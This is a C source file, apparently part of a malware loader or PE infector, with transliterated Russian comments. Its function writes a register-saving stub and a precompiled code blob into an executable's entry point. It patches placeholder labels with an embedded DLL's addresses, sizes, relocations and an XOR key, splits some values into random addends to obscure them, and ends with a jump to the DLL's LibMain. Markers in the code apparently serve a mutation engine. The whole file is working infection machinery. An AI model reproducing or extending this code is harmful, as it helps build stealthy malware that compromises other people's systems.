
 #ifdef dbgdbg
  #define ccdbgdbg      // C_CODE debug
 #endif

//----- GetLen or Write C_CODE into dest

#define MAX_REPL 50

#ifdef _MSC_VER
	#pragma optimize("", off)
#else
	#pragma optimize(off)
#endif

DWORD WriteOrGetLen_C_CODE(unsigned char *dest,DWORD *repl_data,DWORD exe_LibMain_vadr,DWORD epRVA)
{
	DWORD repl_cnt[MAX_REPL];  //@S  // replace counter
	DWORD repl_1st[MAX_REPL];        // pervoe slagaemoe

	unsigned char *b=C_CODE_NG;

	DWORD lins=9;                    // len of inserted code 
	DWORD e;                         // for b 
	DWORD i;                   //@E  // for dest

	DWORD ip1, ip2, abcd;

	#ifdef dbgdbg
		adddeb("\nWriteOrGetLen_C_CODE dest:%u (0==GetLen only)",dest);
		adddeb("C_CODE offset:0x%X\n",&C_CODE_NG);
	#endif

	#ifdef CCRW_BIN
		if (C_CODE_BIN != NULL) b = C_CODE_BIN; //loaded from ccrw.bin
	#endif                       

	if (/*@S!=*/dest != NULL/*@E*/) 
	{ 
		//@S
		for (e = 0; e < MAX_REPL; e++) repl_cnt[e] = 0; 
		//  dest[0]=0x90;  //   nop
		//  dest[1]=0x60;  //   pushad

		// pushad = push eax, ecx, edx, ebx, esp, ebp, esi, edi
		dest[0] = 0x50; //   push        eax
		dest[1] = 0x51; //   push        ecx
		dest[2] = 0x90; //   nop
		dest[3] = 0x52; //   push        edx
		dest[4] = 0x53; //   push        ebx
		dest[5] = 0x54; //   push        esp
		dest[6] = 0x55; //   push        ebp
		dest[7] = 0x56; //   push        esi
		dest[8] = 0x57; //   push        edi

		//@E 
	}  

	for (e = 0;; e++)
	{
	 DWORD dwb;
	 i=/*@S+*/e+lins/*@E*/;    // we should write after inserted code
	 dwb=((DWORD*)&b[e])[0];

	 #ifdef ccdbgdbg
	  adddeb("b[0x%.3X]:\t%.2X   as DWORD:%.8X",e,b[e],dwb);
	 #endif

	 if (/*@S!=*/dest != NULL/*@E*/) //copy code
	 {
		 //---label to replace

		 BOOL LABEL = FALSE; //@S
		 DWORD q, dwx;       //@E

		 for (q = 0xF0; q < 0xFF; q++)
		 {
		 	dwx = /*@S+*/q + q*0x100 + q*0x10000 + q*0x1000000/*@E*/;

		 	// when see 5-bytes instead of 4: XX.XX.XX.XX.XX, use last 4 bytes
		 	// becouse it can be opcode like 
		 	// 817DFC FCFCFCFC   cmp d,[ebp][-04],0FCFCFCFC 
		 	// opcodes started with F0-FE are not possible in our code => we use last 4

		 	if (/*@S&&*/(dwx==dwb)&&(b[e+4]!=q)/*@E*/) LABEL=TRUE;  
		 }                                    

		 if (/*@S==*/LABEL==TRUE/*@E*/) 
		 {
			 DWORD n=0xFE-b[/*@S+*/e+1/*@E*/];

			 #ifdef dbgdbg
			  char desc[0xFF]; my_strcpy(desc,"UNKNOWN");
			  if (n == 0) my_strcpy(desc,"dll_vadr");                   // FE
			  if (n == 1) my_strcpy(desc,"dll_text_vadr");              // FD
			  if (n == 2) my_strcpy(desc,"dll_text_psize");             // FC
			  if (n == 3) my_strcpy(desc,"new_dll_text_vadr");          // FB
			  if (n == 4) my_strcpy(desc,"dll_data_vadr");              // FA
			  if (n == 5) my_strcpy(desc,"dll_data_psize");             // F9
			  if (n == 6) my_strcpy(desc,"new_dll_data_vadr");          // F8
			  if (n == 7) my_strcpy(desc,"reloc_vadr");                 // F7
			  if (n == 8) my_strcpy(desc,"exe_imagebase");              // F6
			  if (n == 9) my_strcpy(desc,"dll_imagebase");              // F5
			  if (n ==10) my_strcpy(desc,"reloc_vadr + dll_fixupsize"); // F4
			  if (n ==11) my_strcpy(desc,"dlltextRVA");                 // F3
			  if (n ==12) my_strcpy(desc,"dlldataRVA");                 // F2
			  if (n ==13) my_strcpy(desc,"dll_len");                    // F1
			  if (n ==14) my_strcpy(desc,"xorkey");                     // F0
			 #endif

			 //-razbit po slagaemim

			 if (/*@S||*/(n==0)||(n==13)/*@E*/)
			 {
			 	//@S
			 	if (/*@S==*/repl_cnt[n]==0/*@E*/) { repl_1st[n]=_rand()%repl_data[n]; ((DWORD*)&dest[i])[0]=repl_1st[n]; }; 
			 	if (/*@S==*/repl_cnt[n]==1/*@E*/) { ((DWORD*)&dest[i])[0]=repl_data[n]-repl_1st[n]; };
			 	//@E

			 	#ifdef dbgdbg
			 	 adddeb("   LABEL_%u (%s) SLAGAEMOE repl_cnt[n]:%i replaced by %.8X of %.8X at OFFSET_0x%X from EntryPoint",n,desc,repl_cnt[n],((DWORD*)&dest[i])[0],repl_data[n],i);
			 	#endif

			 	e+=3;          //@S
			 	repl_cnt[n]++; //@E
			 	continue;
			 }

			 //-

			 #ifdef dbgdbg
			  adddeb("   LABEL_%u (%s) replaced by %.8X at OFFSET_0x%X from EntryPoint",n,desc,repl_data[n],i);
			 #endif

			 ((DWORD*)&dest[i])[0]=repl_data[n]; //@S
			 e+=3;                               //@E
			 continue; 
		 } 

			dest[i]=b[e]; 
	 }

		 // 0xC9==leave 0xC3==ret
		if (/*@S&&*/(b[e]==0xC9)&&(b[e+1]==0xC3)/*@E*/) { /*@S;*/e++; i++/*@E*/; break; };
	}

	#ifdef dbgdbg
	 adddeb("C_CODE size:%u bytes (dec), total:%u (+5 bytes jmp, +%u bytes inserted code)\n",e,e+5+lins,lins);
	#endif

	e += 5;    //@S // +5 bytes jmp
	e += lins; //@E // +lins bytes inserted code
	if (/*@S==*/dest == NULL/*@E*/) return e; // GetLen mode

	//----- write mode only: set jump to LibMain

	dest[i]=0xE9; // jmp opcode
	
	ip1 = /*@S+*/repl_data[8]+epRVA+i/*@E*/; //@S  // eip of jmp xxxxxxxx
	ip2 = exe_LibMain_vadr;                  //@E

	 // abcd=ffffffff-ip1+ip2-4
	 // we use fffffffe and -3 instead: with 0xFFFFFFFF lcc makes stack bug

	abcd = /*@S+*/(0xFFFFFFFE - ip1) + ip2 /*@E*/ - 3;    
	                                                   
	#ifdef dbgdbg
	 adddeb(" SET jmp_exeLibMain_vadr at ip1:%.8X to ip2:%.8X, abcd=%.8X\n",ip1,ip2,abcd);
	#endif

	((DWORD*)(&dest[/*@S+*/i+1/*@E*/]))[0] = abcd;
	i += 4;

	return e;
}

#ifdef _MSC_VER
	#pragma optimize("", on)
#else
	#pragma optimize(on)
#endif